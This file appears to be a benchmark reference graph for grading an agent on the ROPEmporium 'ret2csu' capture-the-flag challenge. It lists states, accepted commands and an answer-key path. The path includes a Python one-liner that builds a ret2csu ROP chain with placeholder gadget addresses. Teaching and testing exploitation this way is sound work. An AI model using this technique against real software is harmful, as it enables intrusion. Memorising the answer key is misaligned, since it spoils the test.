@@ -1,0 +1,128 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: ropemporium_ret2csu
+  name: ROPEmporium ret2csu
+  description: Use the gadgets in __libc_csu_init to populate the required argument
+    registers and call ret2win() with the specified values.
+attacker_context:
+  user: ctf-player
+  access:
+    method: local_shell
+    credentials: null
+  target:
+    host: local
+    path: <path-to-challenge-binary>
+    architecture: <challenge-architecture>
+    os: linux
+goal:
+  node: node5
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- man ropper
+- python3
+- python
+- bash
+- sh
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Overflow offset identified
+- id: node1
+  type: state
+  label: ret2win symbol identified
+- id: node2
+  type: state
+  label: csu gadgets identified
+- id: node3
+  type: state
+  label: Argument values prepared
+- id: node4
+  type: state
+  label: ret2csu payload crafted
+- id: node5
+  type: state
+  label: Flag printed
+edges:
+- action: determine_overflow_offset
+  accepted_commands:
+  - gdb -q ./ret2csu
+  - ragg2 -P 200 -r > pattern.txt && ./ret2csu < pattern.txt
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge0
+  from: start
+  to: node0
+- action: locate_ret2win_symbol
+  accepted_commands:
+  - nm ret2csu | grep ret2win
+  - objdump -d ret2csu | grep ret2win
+  - nm -D libret2csu.so | grep ret2win
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*ret2win.*
+    stderr_regex: .*
+  id: edge1
+  from: node0
+  to: node1
+- action: identify_csu_gadgets
+  accepted_commands:
+  - objdump -d ret2csu | grep __libc_csu_init -A 80
+  - ROPgadget --binary ret2csu | grep "pop rbx"
+  - ropper --file ret2csu --search "mov rdx"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge2
+  from: node1
+  to: node2
+- action: prepare_required_argument_constants
+  accepted_commands:
+  - python3 -c "print(hex(0xdeadbeefdeadbeef))"
+  - python3 -c "print(hex(0xcafebabecafebabe))"
+  - python3 -c "print(hex(0xd00df00dd00df00d))"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+  id: edge3
+  from: node2
+  to: node3
+- action: craft_ret2csu_payload
+  accepted_commands:
+  - python3 -c "from struct import pack; import sys; pad=b'A'*40; pop_csu=0xCSU_POP_GADGET;
+    call_csu=0xCSU_CALL_GADGET; ret2win=0xRET2WIN; arg1=0xdeadbeefdeadbeef; arg2=0xcafebabecafebabe;
+    arg3=0xd00df00dd00df00d; call_target=0xRET2WIN_PTR; chain=pad + pack('<Q', pop_csu)+pack('<Q',0)+pack('<Q',1)+pack('<Q',
+    call_target)+pack('<Q', arg1)+pack('<Q', arg2)+pack('<Q', arg3)+pack('<Q', call_csu)+b'JUNKJUNK'*7+pack('<Q',
+    ret2win); sys.stdout.buffer.write(chain)" > payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge4
+  from: node3
+  to: node4
+- action: execute_payload_and_call_ret2win
+  accepted_commands:
+  - ./ret2csu < payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*flag.*
+    stderr_regex: .*
+  id: edge5
+  from: node4
+  to: node5
